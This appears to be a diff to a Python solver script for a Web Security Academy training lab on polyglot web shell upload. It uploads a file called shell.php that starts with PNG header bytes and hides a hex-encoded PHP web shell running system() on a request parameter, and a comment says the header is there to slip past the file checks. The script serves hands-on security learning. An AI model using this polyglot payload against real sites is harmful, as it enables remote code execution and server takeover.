@@ -2,7 +2,7 @@ import requests
 import argparse
 import re
 
-parser = argparse.ArgumentParser(description='Solves the following Lab: Web shell upload via path traversal')
+parser = argparse.ArgumentParser(description='Solves the following Lab: Remote code execution via polyglot web shell upload')
 parser.add_argument('--id', action='store', help='lab ID, ex: 0a6e00ec03ca2e848083672100ee00fb', required=True)
 lab = parser.parse_args()
 
@@ -19,6 +19,7 @@ headers = {"Cookie":f"session={wiener}"}
 # UPLOAD WEBSHELL
 r = requests.get("https://" + lab.id + ".web-security-academy.net/my-account/", headers=headers)
 csrf = re.search(r'<input[^>]+name=["\']csrf["\'][^>]+value=["\'](.*?)["\']', r.text).group(1)
+# INSTEAD OF REGULAR WEBSHELL, A POLYGLOT WEBSHELL INCLUDING THE PNG HEADER BYTES (\x89\x50\x4E\x47\x0D\x0A\x1a\x0a) IS REQUIRED TO BYPASS CHECKS
 files = {"avatar":('shell.php', b'\x89\x50\x4E\x47\x0D\x0A\x1a\x0a\x3c\x3f\x70\x68\x70\x20\x65\x63\x68\x6f\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x27\x63\x6f\x6d\x6d\x61\x6e\x64\x27\x5d\x29\x3b\x20\x3f\x3e', 'image/png')}
 r = requests.post("https://" + lab.id + ".web-security-academy.net/my-account/avatar", headers=headers, data={"csrf":csrf,"user":"wiener"}, files=files)
 
